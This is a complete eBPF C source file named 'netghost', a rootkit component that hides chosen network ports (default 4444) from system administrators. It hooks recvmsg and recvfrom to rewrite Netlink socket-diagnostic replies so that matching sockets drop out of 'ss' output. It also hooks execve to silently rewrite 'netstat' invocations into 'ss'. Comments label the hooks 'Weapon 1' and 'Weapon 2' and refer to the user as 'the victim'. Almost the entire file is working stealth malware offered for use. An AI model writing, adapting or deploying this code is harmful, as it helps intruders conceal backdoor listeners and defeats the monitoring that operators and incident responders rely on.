// netghost.bpf.c
#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>

char LICENSE[] SEC("license") = "GPL";

char _metadata[] __attribute__((used, section(".metadata"))) =
    "{"
      "\"name\":\"netghost\","
      "\"desc\":\"Ultimate Network Ghost: Hooks Netlink recvmsg/recvfrom to hide ports, AND silently hijacks 'netstat' executions to 'ss'.\","
      "\"requires\":[\"is_root\",\"tracefs\",\"probe_write\"],"
      "\"options\":{"
        "\"target\":[\"4444\",\"Target port number to hide immediately upon loading\"]"
      "},"
      "\"maps\":{"
        "\"target\":{\"key_size\":2,\"value_size\":4,\"key_type\":\"u16\",\"value_type\":\"u32\"}"
      "}"
    "}";

struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 64);
    __type(key, u16);
    __type(value, u32);
} target SEC(".maps");

// Unified record of the base address of the receive buffer
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 1024);
    __type(key, u64);
    __type(value, void *); // Stores the actual buffer pointer
} active_recv_buf SEC(".maps");

struct my_nlmsghdr {
    __u32 nlmsg_len;
    __u16 nlmsg_type;
    __u16 nlmsg_flags;
    __u32 nlmsg_seq;
    __u32 nlmsg_pid;
};

struct my_inet_diag_sockid {
    __be16 idiag_sport;
    __be16 idiag_dport;
    __be32 idiag_src[4];
    __be32 idiag_dst[4];
    __u32  idiag_if;
    __u32  idiag_cookie[2];
};

struct my_inet_diag_msg {
    __u8 idiag_family;
    __u8 idiag_state;
    __u8 idiag_timer;
    __u8 idiag_retrans;
    struct my_inet_diag_sockid id;
};

#define NLMSG_NOOP 1
#define SOCK_DIAG_BY_FAMILY 20

// ========================================================
// Weapon 1: Low-level interception of Netlink diag messages (targets ss)
// ========================================================

SEC("tp/syscalls/sys_enter_recvmsg")
int handle_recvmsg_enter(struct trace_event_raw_sys_enter *ctx) {
    u64 id = bpf_get_current_pid_tgid();
    void *msg_ptr = (void *)ctx->args[1];
    
    struct iovec *iov_ptr = NULL;
    bpf_probe_read_user(&iov_ptr, sizeof(iov_ptr), msg_ptr + offsetof(struct user_msghdr, msg_iov));
    
    if (iov_ptr) {
        struct iovec iov = {};
        if (bpf_probe_read_user(&iov, sizeof(iov), iov_ptr) == 0) {
            void *base = iov.iov_base;
            if (base) bpf_map_update_elem(&active_recv_buf, &id, &base, BPF_ANY);
        }
    }
    return 0;
}

SEC("tp/syscalls/sys_enter_recvfrom")
int handle_recvfrom_enter(struct trace_event_raw_sys_enter *ctx) {
    u64 id = bpf_get_current_pid_tgid();
    void *base = (void *)ctx->args[1]; 
    if (base) bpf_map_update_elem(&active_recv_buf, &id, &base, BPF_ANY);
    return 0;
}

struct loop_ctx {
    void *base;
    u32 safe_len;
    unsigned int offset;
};

static __always_inline long parse_nl_msg(u32 index, void *ctx) {
    struct loop_ctx *lctx = (struct loop_ctx *)ctx;

    if (lctx->offset >= lctx->safe_len) return 1;

    struct my_nlmsghdr nlh = {};
    if (bpf_probe_read_user(&nlh, sizeof(nlh), lctx->base + lctx->offset) != 0) return 1;

    unsigned int msg_len = nlh.nlmsg_len;
    if (msg_len < sizeof(nlh) || lctx->offset + msg_len > lctx->safe_len) return 1;

    if (nlh.nlmsg_type == 20 || nlh.nlmsg_type == 18) {
        struct my_inet_diag_msg diag = {};
        if (bpf_probe_read_user(&diag, sizeof(diag), lctx->base + lctx->offset + sizeof(nlh)) == 0) {
            
            u16 sport_be = diag.id.idiag_sport;
            u16 sport = ((sport_be >> 8) & 0xFF) | ((sport_be & 0xFF) << 8);
            
            if (sport > 0) {
                u32 port_key = sport;
                if (bpf_map_lookup_elem(&target, &port_key)) {
                        // Ultimate kill 1: Destroy protocol family (Family)
                        // Targeting the dead spot in ss source code, change it to AF_UNSPEC (0)
                        // When ss sees a non-IPv4/IPv6 family, it directly returns 0 and drops the whole line!
                        u8 fake_family = 0; 
                        bpf_probe_write_user(lctx->base + lctx->offset + sizeof(nlh) + offsetof(struct my_inet_diag_msg, idiag_family), &fake_family, sizeof(fake_family));
                        
                        // Ultimate kill 2: Physical destruction of the port (reserved, just in case)
                        u16 fake_port = 0;
                        bpf_probe_write_user(lctx->base + lctx->offset + sizeof(nlh) + offsetof(struct my_inet_diag_msg, id.idiag_sport), &fake_port, sizeof(fake_port));
                }
            }
        }
    }

    lctx->offset += (msg_len + 3) & ~3;
    return 0;
}

static __always_inline void process_netlink_buffer(long ret, void *base) {
    if (ret <= 0 || ret > 65535) return;
    
    u32 safe_len = ret & 0xFFFF;
    if (safe_len == 0) return;

    struct loop_ctx lctx = {
        .base = base,
        .safe_len = safe_len,
        .offset = 0
    };

    bpf_loop(1024, parse_nl_msg, &lctx, 0);
}

SEC("tp/syscalls/sys_exit_recvmsg")
int handle_recvmsg_exit(struct trace_event_raw_sys_exit *ctx) {
    u64 id = bpf_get_current_pid_tgid();
    void **base_ptr = bpf_map_lookup_elem(&active_recv_buf, &id);
    if (base_ptr) {
        void *base = *base_ptr;
        bpf_map_delete_elem(&active_recv_buf, &id);
        process_netlink_buffer(ctx->ret, base);
    }
    return 0;
}

SEC("tp/syscalls/sys_exit_recvfrom")
int handle_recvfrom_exit(struct trace_event_raw_sys_exit *ctx) {
    u64 id = bpf_get_current_pid_tgid();
    void **base_ptr = bpf_map_lookup_elem(&active_recv_buf, &id);
    if (base_ptr) {
        void *base = *base_ptr;
        bpf_map_delete_elem(&active_recv_buf, &id);
        process_netlink_buffer(ctx->ret, base);
    }
    return 0;
}

// ========================================================
// Weapon 2: Command line instruction hijacking (bait and switch, targets netstat)
// ========================================================

SEC("tp/syscalls/sys_enter_execve")
int handle_execve_enter(struct trace_event_raw_sys_enter *ctx) {
    const char *user_filename = (const char *)ctx->args[0];
    char filename[256] = {};

    if (bpf_probe_read_user_str(filename, sizeof(filename), user_filename) <= 0)
        return 0;

    #pragma unroll
    for (int i = 0; i < 256 - 7; i++) {
        if (filename[i] == '\0') break;

        // If the victim attempts to execute netstat
        if (filename[i] == 'n' && filename[i+1] == 'e' && filename[i+2] == 't' &&
            filename[i+3] == 's' && filename[i+4] == 't' && filename[i+5] == 'a' && 
            filename[i+6] == 't') {
            
            // Forcibly change it to ss
            char replacement[8] = "ss\0\0\0\0\0"; 
            bpf_probe_write_user((void *)(user_filename + i), replacement, 7);
            
            break;
        }
    }

    return 0;
}